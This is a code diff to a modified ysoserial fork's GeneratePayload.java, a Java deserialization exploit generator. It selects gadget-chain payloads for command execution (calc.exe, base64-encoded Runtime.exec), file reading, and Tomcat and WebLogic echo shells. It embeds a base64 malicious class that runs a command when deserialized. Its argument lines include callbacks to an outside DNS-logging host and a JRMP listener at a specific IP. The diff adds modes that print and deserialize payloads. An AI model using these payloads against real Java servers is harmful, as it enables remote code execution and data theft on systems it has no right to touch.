@@ -1,16 +1,14 @@
 package ysoserial;
 
-import java.io.FileOutputStream;
-import java.io.ObjectOutputStream;
-import java.io.PrintStream;
+import java.io.*;
 import java.util.*;
 
 import ysoserial.payloads.ObjectPayload;
 import ysoserial.payloads.ObjectPayload.Utils;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
-
-import java.lang.reflect.Field;
+import ysoserial.payloads.util.MyObjectInputStream;
+import ysoserial.payloads.util.unserUtils;
 
 @SuppressWarnings("rawtypes")
 public class GeneratePayload {
@@ -18,9 +16,11 @@ public class GeneratePayload {
     private static final int USAGE_CODE = 64;
 
     public static void main(final String[] args) {
-        //String[] argss = new String[]{"URLDNS", "http://success.10k6l4.ceye.io"};
-        //String[] argss = new String[]{"CommonsCollections2", "echo 123>cc2.txt"};
-        String[] argss = new String[]{"CommonsCollections10", "calc.exe"};
+//        String[] argss = new String[]{"URLDNS", "http://success.10k6l4.ceye.io"};
+//        String[] argss = new String[]{"JRMPClient", "8.129.107.19:7777"};
+        String[] argss = new String[]{"CommonsCollectionsURL", "file:///d:/a.txt|0|102"};
+//        String[] argss = new String[]{"CommonsCollections10", "calc.exe"};
+//        String[] argss = new String[]{"CommonsCollectionsDoubleUnser", "calc.exe"};
         //修改了yso原有cc链createTemplatesImpl->insertAfter中的cmd
 //        String[] argss = new String[]{"CommonsCollections2", "UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiY2FsYy5leGUiKTs="};//base64('Runtime.getRuntime().exec("calc.exe");')
 //        String[] argss = new String[]{"CommonsCollections3", "UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiY2FsYy5leGUiKTs="};//base64('Runtime.getRuntime().exec("calc.exe");')
@@ -30,23 +30,9 @@ public class GeneratePayload {
         //String[] argss = new String[]{"CommonsCollections10Echo", "TomcatBigHeader"};
         //String[] argss = new String[]{"CommonsCollections10Echo", "Tomcat78ClassLoader"};
 
-        //String[] argss = new String[]{"CommonsCollections2Echo", "TomcatEchoInject"};
-        //String[] argss = new String[]{"CommonsCollections2Echo", "TomcatEchoShell"};
-
-        //String[] argss = new String[]{"CommonsCollections2Echo", "TomcatServletResponse1"};
-        //String[] argss = new String[]{"CommonsCollections2Echo", "TomcatServletClassLoader"};
-        //String[] argss = new String[]{"CommonsCollections2Echo", "Tomcat78ClassLoader"};
-//        String[] argss = new String[]{"CommonsCollections2Echo", "WLSAddServlet"};
-
-        //tomcat78 tomcat9回显doWrite使用的参数类型不同
-//        String[] argss = new String[]{"CommonsCollections2Echo", "Tomcat78"};
-//        String[] argss = new String[]{"CommonsCollections2Echo", "Tomcat9"};
-
 //        String[] argss = new String[]{"ysoserial.exploit.JRMPListener", "7777", "CommonsCollections1", "touch /tmp/popko"};
         //String[] argss = new String[]{"JRMPListener", "7777"};
         //String[] argss = new String[]{"CommonsCollections2Echo", "SpringMVCEcho"};
-        //String[] argss = new String[]{"CommonsCollections2Echo", "TomcatAddServlet"};
-        //String[] argss = new String[]{"CommonsCollections2Echo", "TomcatAddServletClassLoader"};
         String content = "yv66vgAAADMALgoABwAbCgAcAB0KAB4AHwgAIAoAHgAhBwAiBwAjBwAkAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtMdW5zZXJFdmlsOwEACkV4Y2VwdGlvbnMHACUBAAt3cml0ZU9iamVjdAEAHihMamF2YS9pby9PYmplY3RJbnB1dFN0cmVhbTspVgEAAW8BABtMamF2YS9pby9PYmplY3RJbnB1dFN0cmVhbTsHACYBAApyZWFkT2JqZWN0AQACaW4BAApTb3VyY2VGaWxlAQAOdW5zZXJFdmlsLmphdmEMAAkACgcAJwwAKAAKBwApDAAqACsBAAhjYWxjLmV4ZQwALAAtAQAJdW5zZXJFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABlqYXZhL2lvL09iamVjdElucHV0U3RyZWFtAQARZGVmYXVsdFJlYWRPYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABgAHAAEACAAAAAMAAQAJAAoAAgALAAAAMwABAAEAAAAFKrcAAbEAAAACAAwAAAAKAAIAAAAGAAQABwANAAAADAABAAAABQAOAA8AAAAQAAAABAABABEAAgASABMAAgALAAAAPQABAAIAAAAFK7YAArEAAAACAAwAAAAKAAIAAAAKAAQACwANAAAAFgACAAAABQAOAA8AAAAAAAUAFAAVAAEAEAAAAAQAAQAWAAIAFwATAAIACwAAAEoAAgACAAAADiu2AAK4AAMSBLYABVexAAAAAgAMAAAADgADAAAADgAEABAADQARAA0AAAAWAAIAAAAOAA4ADwAAAAAADgAYABUAAQAQAAAABAABABYAAQAZAAAAAgAa";
         //String[] argss = new String[]{"AspectJWeaverNonrce", "target/classes/unserEvil.class;"+content};
         //String[] argss = new String[]{"BeanShell1", "calc.exe"};
@@ -82,6 +68,20 @@ public class GeneratePayload {
                 PrintStream out = System.out;
                 Serializer.serialize(object, out);
                 ObjectPayload.Utils.releasePayload(payload, object);
+            } else if (flag.equals("hexprint")) {
+                String data = unserUtils.objectToHexString(object);
+                System.out.println(data);
+                byte[] b = unserUtils.hexStringToBytes(data);
+                InputStream inputStream = new ByteArrayInputStream(b);
+//                ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
+                ObjectInputStream objectInputStream = new MyObjectInputStream(inputStream);
+//                System.out.println(objectInputStream.readUTF());
+//                System.out.println(objectInputStream.readInt());
+//                if (name.equals("0CTF/TCTF") && year == 2021) {
+//                }
+                objectInputStream.readObject();
+            } else if (flag.equals("b64print")) {
+                System.out.println(unserUtils.objectToB64String(object));
             } else {//write
                 String filePre;
                 String filename;
